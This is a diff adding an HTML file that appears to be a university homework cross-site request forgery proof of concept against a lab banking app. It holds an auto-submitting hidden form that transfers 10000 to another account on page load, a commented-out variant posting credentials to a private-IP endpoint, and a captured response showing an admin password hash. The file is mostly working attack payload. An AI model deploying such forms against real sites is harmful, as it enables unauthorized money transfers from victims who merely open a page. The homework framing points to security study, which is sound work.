@@ -1,0 +1,22 @@
+<!-- THIS IS FOR HOMEWORK AT UNIVERSITY. I AM NOT ATTACKING SYSTEMS I DO NOT HAVE PERMISSION TO ATTACK -->
+
+<!-- <form action="http://192.168.2.98:49698/viewtransfer" method="GET" id="csrf">
+    <input type="hidden" name="username" value="w@w.com" id="csrf"/>
+    <input type="hidden" name="password" value="w" id="csrf"/>
+</form>
+<script>
+    document.getElementById('csrf').submit()
+</script> -->
+<form action="/transfer" method="POST" id="csrf">
+    <input type="hidden" name="user_to" value="w@w.com" id="csrf"/>
+    <input type="hidden" name="amount" value="10000" id="csrf"/>
+</form>
+<script>
+    document.getElementById('csrf').submit()
+</script>
+
+<!-- This is the response JSON 
+    {"username":"admin","passwordhash":"$2b$06$lHkcolzzuTURT1NowVfNDu1T5kX3NMYWJ/STm4W/8ZgiR3dWswX7K","money":11009} -->
+
+<!-- This is the request body for the POST request
+    user_to=admin&amount=1 -->
